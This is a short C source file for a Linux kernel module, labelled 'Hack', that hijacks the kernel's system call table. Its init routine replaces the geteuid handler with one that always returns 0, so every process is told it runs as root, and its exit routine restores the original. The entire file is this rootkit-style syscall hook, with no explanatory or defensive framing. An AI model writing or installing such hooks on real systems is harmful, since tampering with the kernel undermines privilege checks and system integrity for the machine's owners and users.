#include <linux/kernel.h>
#include <linux/module.h>
//#include <sys/syscall.h>

extern void *sys_call_table[];

asmlinkage long(*old)(void);

asmlinkage long my_geteuid(void)
{
	return 0;
}

static int __init phantom_init(void)
{
	old = sys_call_table[__NR_geteuid];
	sys_call_table[__NR_geteuid] = my_geteuid;

	return 0;
}

static void __exit phantom_exit(void)
{
	sys_call_table[__NR_geteuid] = old;
}

module_init(phantom_init);
module_exit(phantom_exit);

MODULE_AUTHOR("Jiri Slaby <jirislaby@gmail.com>");
MODULE_DESCRIPTION("Hack");
MODULE_LICENSE("GPL");
